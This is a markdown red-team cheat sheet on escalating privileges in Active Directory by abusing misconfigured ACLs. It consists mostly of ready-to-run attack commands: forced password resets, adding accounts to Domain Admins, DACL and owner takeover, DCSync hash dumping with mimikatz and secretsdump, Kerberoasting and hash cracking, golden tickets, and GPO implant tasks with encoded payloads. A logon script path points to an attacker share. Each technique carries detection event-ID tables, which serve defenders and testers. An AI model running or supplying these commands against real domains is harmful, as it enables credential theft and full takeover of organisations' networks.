# Domain Privilege Escalation via ACL Abuse

## Overview

Active Directory ACLs (Access Control Lists) define who can perform what actions on objects. Misconfigured ACLs are one of the most common and powerful escalation paths. BloodHound maps these as edges like `ForceChangePassword`, `GenericAll`, `GenericWrite`, `WriteDACL`, etc.

## Enumeration — Finding Interesting ACLs

### BloodHound (Recommended)

```cypher
// All ACL abuse edges
MATCH (n)-[r]->(m)
WHERE TYPE(r) IN
  ['GenericAll','GenericWrite','WriteOwner','WriteDacl',
   'ForceChangePassword','AllExtendedRights','AddMember',
   'AddSelf','GetChanges','GetChangesAll']
RETURN n.name, TYPE(r), m.name

// Find specific user's effective permissions
MATCH (u:User {name:"USER@DOMAIN.LOCAL"})-[r]->(m)
WHERE TYPE(r) IN ['GenericAll','GenericWrite','WriteOwner','WriteDacl',
                  'ForceChangePassword','AllExtendedRights']
RETURN u.name, TYPE(r), m.name

// Find users who can modify group membership
MATCH (u:User)-[r:GenericAll|GenericWrite|AddMember]->(g:Group)
RETURN u.name, TYPE(r), g.name

// Find all control paths to Domain Admins
MATCH (u:User)
MATCH (g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH p = shortestPath((u)-[:GenericAll|GenericWrite|WriteOwner|
  WriteDacl|ForceChangePassword|AllExtendedRights|
  AddMember|MemberOf*1..]->(g))
RETURN u.name, length(p) AS PathLength
ORDER BY PathLength ASC
```

### PowerView

```powershell
# Get all ACLs for a specific user
Get-DomainObjectAcl -Identity target_user -ResolveGUIDs

# Find interesting ACLs for current user
Find-InterestingDomainAcl

# Find ACLs where a specific user/group has rights
Get-DomainObjectAcl -PrincipalIdentity user -ResolveGUIDs

# Get ACL for specific object
Get-DomainObjectAcl -Identity "DC=domain,DC=local" | ? { $_.SecurityIdentifier -eq $sid }

# Resolve SIDs to names
ConvertFrom-SID $sid

# Total ACL dump for all objects (loud, large output)
Get-DomainObjectAcl -Domain domain.local -ResolveGUIDs
```

### NetExec

```bash
# Find interesting ACLs
nxc ldap dc01.domain.local -u user -p pass -M find-InterestingDomainAcl

# Dump ACLs
nxc ldap dc01.domain.local -u user -p pass --acls
```

## ACL Abuse Techniques

### 1. ForceChangePassword (User-Force-Change-Password)

**Prerequisites**: Target user has ACL granting `User-Force-Change-Password` right to attacker.

**Effect**: Reset the target user's password without knowing current password.

```powershell
# PowerView
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewP@ss123" -AsPlainText -Force) -Verbose

# AD Module
Set-ADAccountPassword -Identity target_user -Reset -NewPassword (ConvertTo-SecureString "NewP@ss123" -AsPlainText -Force)

# net user (if user is a non-protected account/ no smartcard required)
net user target_user NewP@ss123 /domain

# Python (impacket)
python3 smbpasswd.py domain/user:'oldpass'@DC01 -newpass 'NewP@ss123' -target 'target_user' -altuser user -altpass 'pass'

# Through LDAP modify
# Using ldapmodify with proper extended rights
```

**OPSEC**: Password reset generates Event ID 4724 (attempt to reset password). Protected users (adminCount=1) cannot be reset if in Protected Users group or if adminCount > 0 without additional permissions.

**Detection**:
| Event ID | Description |
|----------|-------------|
| 4723 | User changed own password |
| 4724 | Password reset attempt |
| 4738 | User account changed |

---

### 2. AddMember / AddSelf (Add member to group)

**Prerequisites**: ACL grants `AddMember` (Self-Membership) or GenericAll/GenericWrite on a group.

**Effect**: Add yourself (or another user) to a privileged group.

```powershell
# PowerView - Add user to group
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user' -Verbose

# AD Module
Add-ADGroupMember -Identity "Domain Admins" -Members "user"

# net group
net group "Domain Admins" user /add /domain

# Python via ldap (impacket)
python3 addGroupMember.py domain/user:pass -group "CN=Domain Admins,CN=Users,DC=domain,DC=local" -member "CN=user,CN=Users,DC=domain,DC=local"

# Add computer to group
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'computer$'

# Add self to group (if AddSelf right)
# No direct PowerView function - use ADSI/LDAP directly
$group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=local"
$group.Add("LDAP://CN=attacker,CN=Users,DC=domain,DC=local")
```

**OPSEC**: Group membership changes generate Event ID 4728 (user added to global group), 4732 (user added to local group), 4756 (user added to universal group). Immediate alert in most SOCs.

**Detection**:
| Event ID | Description |
|----------|-------------|
| 4728 | Member added to security-enabled global group |
| 4729 | Member removed from security-enabled global group |
| 4732 | Member added to security-enabled local group |
| 4733 | Member removed from security-enabled local group |
| 4756 | Member added to security-enabled universal group |
| 4757 | Member removed from security-enabled universal group |

---

### 3. GenericAll (Full control)

**Prerequisites**: `GenericAll` ACL on a user, group, computer, or domain object.

**Effect**: Complete control. On user = reset password, set SPN for Kerberoast. On group = add members. On computer = RBCD. On domain = DCSync.

```powershell
# GenericAll on a User → Reset password or set SPN for Kerberoast
# Reset password
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewP@ss123" -AsPlainText -Force)

# Set SPN to make user Kerberoastable
Set-DomainObject -Identity target_user -SET @{serviceprincipalname='http/test'}

# GenericAll on a Group → Add members
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'

# GenericAll on a Computer → RBCD attack
# See 07_RBCD.md for full details
Set-DomainObject -Identity target_computer -SET @{ 'msDS-AllowedToActOnBehalfOfOtherIdentity' = $raw_bytes }

# GenericAll on Domain → DCSync
# See 03_Credential_Access/DCSync attack or via PowerView ACL
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync
```

**OPSEC**: GenericAll usage depends on which action you take (password reset, group add, etc.). Each has corresponding event IDs (see above/below).

**Detection**: Dependent on the action performed through the GenericAll right.

---

### 4. GenericWrite

**Prerequisites**: `GenericWrite` ACL on a user, group, computer, or service object.

**Effect**: Write access to object attributes but not full control. On user = set SPN (Kerberoast), write description, set script path. On group = add members (if group type allows). On computer = RBCD. On Service Connection Point (SCP) = various.

```powershell
# GenericWrite on a User → Write SPN for Kerberoast
Set-DomainObject -Identity target_user -SET @{serviceprincipalname='http/test'}

# Now the user is Kerberoastable
# Request TGS and crack offline
Request-SPNTicket -SPN "http/test"

# GenericWrite on a Group → Write membership (if group type enables)
Set-DomainObject -Identity "CN=Domain Admins,CN=Users,DC=domain,DC=local" -Add @{member="CN=user,CN=Users,DC=domain,DC=local"}

# GenericWrite on a Computer → RBCD
Set-DomainObject -Identity target_computer -SET @{ 'msDS-AllowedToActOnBehalfOfOtherIdentity' = $raw_bytes }

# GenericWrite on User → Set logon script
Set-DomainObject -Identity target_user -SET @{scriptPath='\\attacker\share\malicious.ps1'}
```

**OPSEC**: Writing SPN generates Event ID 5136 (Directory Service Change). Setting scriptPath generates the same. RBCD change is also 5136.

**Detection**:
| Event ID | Description |
|----------|-------------|
| 5136 | Directory Service object modification |
| 4662 | Directory Service access |

---

### 5. WriteOwner

**Prerequisites**: `WriteOwner` ACL on a target object.

**Effect**: Change the object's owner to a user you control. Then as owner you can write the DACL and grant yourself full control.

```powershell
# Change owner to yourself
Set-DomainObjectOwner -Identity target_group -OwnerIdentity attacker

# After becoming owner, grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity target_group -PrincipalIdentity attacker -Rights All

# Now you can add yourself to the group
Add-DomainGroupMember -Identity target_group -Members attacker

# Manual approach with ADSI
$group = [ADSI]"LDAP://CN=Target Group,CN=Users,DC=domain,DC=local"
$group.PSBase.Owner = "CN=attacker,CN=Users,DC=domain,DC=local"
$group.PSBase.CommitChanges()
```

**OPSEC**: Owner change generates Event ID 5136 with attribute `nTSecurityDescriptor`. Event ID 4662 for accessing the object. Two-step attack (owner change + DACL write) generates two 5136 events.

**Detection**:
| Event ID | Description |
|----------|-------------|
| 5136 | Directory Service modification (owner change) |
| 4662 | Directory Service access |

---

### 6. WriteDACL

**Prerequisites**: `WriteDACL` ACL on a target object.

**Effect**: Modify the DACL to grant yourself (or others) rights on the target object. Full control achievable by granting GenericAll.

```powershell
# Grant yourself full control by modifying DACL
Add-DomainObjectAcl -TargetIdentity target_object -PrincipalIdentity attacker -Rights All

# Grant specific rights (DCSync on domain)
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# Grant user-Force-Change-Password on a specific user
Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity attacker -Rights ResetPassword

# Remove rights
Remove-DomainObjectAcl -TargetIdentity target_object -PrincipalIdentity attacker -Rights All

# Using ADSI to modify DACL directly
$path = "LDAP://CN=Target,CN=Users,DC=domain,DC=local"
$obj = [ADSI]$path
$obj.PSBase.ObjectSecurity.SetAccessRule($rule)
$obj.PSBase.CommitChanges()
```

**OPSEC**: DACL modification generates Event ID 5136 on `nTSecurityDescriptor`. One of the most heavily monitored event types in modern AD environments.

**Detection**:
| Event ID | Description |
|----------|-------------|
| 5136 | Directory Service modification (DACL change) |
| 4662 | Directory Service access |

---

### 7. AllExtendedRights

**Prerequisites**: `AllExtendedRights` ACL on a target object.

**Effect**: Includes all extended rights, which typically includes `User-Force-Change-Password`, `DS-Replication-Get-Changes` (DCSync), and other extended rights.

```powershell
# If on a User object → can reset password
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewP@ss123" -AsPlainText -Force)

# If on a Domain object → effectively DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# Use secretsdump.py after granting DCSync
python3 secretsdump.py domain/attacker:pass@DC01.domain.local -just-dc
```

**OPSEC**: Same as ForceChangePassword or DCSync depending on usage.

**Detection**:
| Event ID | Description |
|----------|-------------|
| 5136 | Directory Service modification |
| 4662 | Directory Service access |
| 4724 | Password reset attempt |

---

### 8. DCSync Rights (DS-Replication-Get-Changes / DS-Replication-Get-Changes-All)

**Prerequisites**: ACL on the domain root (`DC=domain,DC=local`) granting `DS-Replication-Get-Changes` and optionally `DS-Replication-Get-Changes-All`. Alternatively, `GenericAll` or `WriteDACL` on the domain root to grant yourself DCSync.

**Effect**: Replicate directory changes from the DC, including password hashes for all users.

```powershell
# Check who can DCSync via PowerView
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -SearchScope Base -ResolveGUIDs | ? {
  ($_.ObjectAceType -eq 'DS-Replication-Get-Changes') -or
  ($_.ObjectAceType -eq 'DS-Replication-Get-Changes-All')
} | % { ConvertFrom-SID $_.SecurityIdentifier }

# Grant DCSync rights (needs WriteDACL or GenericAll on domain)
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# Check via BloodHound
MATCH (n)-[r:GetChanges|:GetChangesAll]->(m:Domain) RETURN n.name, TYPE(r)

# Exploit with mimikatz
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator" exit

# Exploit with impacket
python3 secretsdump.py domain/attacker:pass@DC01.domain.local -just-dc
python3 secretsdump.py domain/attacker:pass@DC01.domain.local -just-dc-user krbtgt

# Exploit with NetExec
nxc smb DC01.domain.local -u attacker -p pass --ntds
```

**OPSEC**: DCSync generates Event ID 4662 with access mask `DS-Replication-Get-Changes`. Domain controllers must allow replication. Most heavily monitored attack — immediate SOC alert.

**Detection**:
| Event ID | Description |
|----------|-------------|
| 4662 | Directory Service access with DS-Replication-Get-Changes |
| 4688 | secretsdump/mimikatz process |
| 5140 | SMB file share access (if dumping NTDS.dit) |

---

### 9. WriteSPN (Write ServicePrincipalName)

**Prerequisites**: `WriteServicePrincipalName` (Validated-SPN) or `GenericWrite` on a user.

**Effect**: Set an SPN on a target user to make them Kerberoastable, then request their TGS and crack offline.

```powershell
# Set SPN to make target Kerberoastable
Set-DomainObject -Identity target_user -SET @{serviceprincipalname='http/test'}

# Verify SPN was set
Get-DomainUser -Identity target_user -Properties serviceprincipalname

# Request TGS
Request-SPNTicket -SPN "http/test"

# Or with Rubeus
Rubeus.exe kerberoast /user:target_user /nowrap

# Crack offline
hashcat -m 13100 hash.txt rockyou.txt
john --format=krb5tgs hash.txt --wordlist=rockyou.txt
```

**OPSEC**: Modifying SPN generates Event ID 5136. TGS-REQ (Kerberoast) generates Event ID 4769 with encryption type detection. Modern environments may alert on RC4 TGS requests.

**Detection**:
| Event ID | Description |
|----------|-------------|
| 5136 | Directory Service modification (SPN changed) |
| 4769 | Kerberos TGS request |
| 4688 | Tool execution |

---

### 10. GPO Abuse via ACL

**Prerequisites**: `GenericWrite` or `WriteDACL` on a GPO object.

**Effect**: Modify the GPO to add malicious scripts, scheduled tasks, local admin rights, or registry changes. The GPO applies to all computers/users in linked OUs.

```powershell
# Find modifiable GPOs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericWrite|WriteDacl|WriteOwner" }

# Also via BloodHound
MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO) RETURN n.name, TYPE(r), g.name

# New-GPOImplantTask - Add malicious scheduled task via GPO
New-GPOImplantTask -GPOName "Default Domain Policy" -TaskName "SystemUpdater" -Command "powershell" -CommandArguments "-enc <base64>" -Scope User -Verbose

# Add local admin via Restricted Groups GPO
# Use PowerView to modify GPO security settings
```

**OPSEC**: GPO modification events: Sysmon EID 13 (registry change from GPO update), 4688 (new process from GPO script), 5136 (GPO object change). GPUpdate triggers 5312-5318 events.

**Detection**:
| Event ID | Description |
|----------|-------------|
| 5136 | GPO modification in AD |
| 5312-5318 | Group Policy application events |
| Sysmon EID 13 | Registry change via GPO |
| 4688 | Script execution from GPO |

---

## ACL Abuse — Attack Chains

### Chain 1: GenericAll on User → Domain Admin

```powershell
# 1. User has GenericAll on low-priv user
# 2. That user has GenericWrite on Domain Admin group member
# 3. Reset password on that user
# 4. Log in, profit

Set-DomainUserPassword -Identity bridge_user -AccountPassword (ConvertTo-SecureString "P@ss123" -AsPlainText -Force)

# Or set SPN and Kerberoast the DA user
Set-DomainObject -Identity da_user -SET @{serviceprincipalname='http/DA'}

# Request TGS
Rubeus.exe kerberoast /user:da_user /nowrap

# Crack offline
```

### Chain 2: WriteDACL on Domain → DCSync → Full Domain Compromise

```powershell
# 1. User has WriteDACL on domain root
# 2. Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# 3. Dump all hashes
python3 secretsdump.py domain/attacker:pass@DC01.domain.local -just-dc

# 4. Use krbtgt hash for golden ticket
mimikatz.exe "kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH_HERE /user:Administrator /ptt" exit
```

### Chain 3: GenericWrite on Computer → RBCD → DA Session

```powershell
# 1. GenericWrite on a computer
# 2. RBCD attack (see 07_RBCD.md)
Set-DomainObject -Identity target_computer -SET @{ 'msDS-AllowedToActOnBehalfOfOtherIdentity' = $raw_bytes }

# 3. Impersonate DA who has session on that computer
python3 getST.py domain/user:pass -spn cifs/target_computer -impersonate Administrator -dc-ip DC

# 4. Access DA resources via the computer
```

### Chain 4: WriteOwner on Group → Full Group Control → DA

```powershell
# 1. WriteOwner on a group that is member of Domain Admins
Set-DomainObjectOwner -Identity "CN=Delegated Admins,CN=Users,DC=domain,DC=local" -OwnerIdentity attacker

# 2. As owner, grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "CN=Delegated Admins,CN=Users,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All

# 3. Add yourself to the group
Add-DomainGroupMember -Identity "Delegated Admins" -Members 'attacker'
```

## OPSEC Summary

| Operation | Event ID | Noise Level |
|-----------|----------|-------------|
| ForceChangePassword | 4724 | Medium |
| Add to group | 4728/4732/4756 | High |
| GenericAll/Write use | Varies | Depends |
| WriteOwner | 5136 | Medium |
| WriteDACL | 5136 | Medium |
| DCSync | 4662 | Critical |
| WriteSPN | 5136, 4769 | Medium |
| GPO modify | 5136, 5312-5318 | High |

## Quick Reference

```powershell
# Find modifiable ACLs (PowerView)
Find-InterestingDomainAcl

# ForceChangePassword
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString "P@ss123" -AsPlainText -Force)

# Add group member
Add-DomainGroupMember -Identity "Domain Admins" -Members user

# Write SPN for Kerberoast
Set-DomainObject -Identity user -SET @{serviceprincipalname='http/test'}

# DCSync grant
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync

# WriteOwner
Set-DomainObjectOwner -Identity target -OwnerIdentity user

# GenericAll Computer RBCD
Set-DomainObject -Identity computer -SET @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$raw_bytes}

# BloodHound - All ACLs
MATCH (n)-[r]->(m) WHERE TYPE(r) IN ['GenericAll','GenericWrite','WriteOwner','WriteDacl','ForceChangePassword','AllExtendedRights','AddMember'] RETURN n.name, TYPE(r), m.name
```
